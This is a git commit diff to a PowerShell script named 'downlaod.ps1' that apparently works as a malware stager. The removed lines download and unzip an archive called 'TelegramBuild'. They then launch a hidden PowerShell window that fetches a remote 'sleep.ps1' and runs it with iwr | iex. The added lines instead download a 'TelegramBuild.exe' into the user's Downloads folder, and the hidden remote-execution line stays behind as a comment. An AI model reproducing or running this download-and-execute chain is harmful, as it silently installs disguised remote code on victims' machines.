3e0340ab217364a9793394a143f028776710abc4
waed69 <waedpsn2@gmail.com>
2025-04-26 16:35:47 +0200

    Update downlaod.ps1

--- downlaod.ps1
+++ downlaod.ps1
@@ -1,15 +1,6 @@
-# --- Variables ---
-$url = "https://github.com/waed69/n/raw/refs/heads/main/TelegramBuild.zip"
-$downloadPath = "C:\Users\$env:USERNAME\Downloads\TelegramBuild.zip"
-$extractPath = "C:\Users\$env:USERNAME\Downloads\TelegramBuild"  # Folder to unzip
-
-# --- Download the ZIP file ---
-Invoke-WebRequest $url -OutFile $downloadPath
-Start-Sleep -Seconds 3
-
-# --- Extract the ZIP file ---
-Expand-Archive -Path $downloadPath -DestinationPath $extractPath -Force
-Start-Sleep -Seconds 4
+$Source = "https://github.com/waed69/n/raw/refs/heads/main/TelegramBuild.exe"  
+$Destination = "C:\Users\$env:USERNAME\Downloads\"  
+Invoke-WebRequest -Uri $source -OutFile $Destination 
 
 #run the next script
-Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"iwr https://raw.githubusercontent.com/waed69/Brabus/main/sleep.ps1 | iex`""
+#Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"iwr https://raw.githubusercontent.com/waed69/Brabus/main/sleep.ps1 | iex`""
